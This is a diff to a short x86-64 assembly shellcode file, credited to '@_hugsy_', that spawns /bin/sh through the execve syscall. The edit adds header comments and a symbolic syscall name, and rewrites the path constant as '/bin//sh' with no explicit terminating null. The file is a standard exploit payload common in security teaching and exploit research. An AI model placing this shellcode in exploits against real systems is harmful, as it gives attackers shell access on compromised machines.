@@ -1,12 +1,21 @@
-;; rax = sys_execve
-mov rax, 59
-;; write /bin/sh @rsp
-mov rsi, 0x0068732f6e69622f
+;;; @@@ arch:x86_64 @@@
+;;; @@@ endian:little @@@
+;;; @@@ syntax:intel @@@
+;;;
+;;; Intel x86-64 little endian sys_execve("/bin/sh")
+;;; shellcode
+;;; by @_hugsy_
+;;;
+
+;;; rax = sys_execve
+mov rax, __NR_SYS_execve
+;;; write /bin/sh @rsp
+mov rsi, "hs//nib/" # or 0x68732f2f6e69622f
 mov [rsp], rsi
-;; rdi = @/bin/sh
+;;; rdi = @/bin/sh
 mov rdi, rsp
-;; nullify the other args
+;;; nullify the other args
 xor rsi, rsi
 xor rdx, rdx
-;; trigger interrupt
+;;; trigger syscall
 syscall
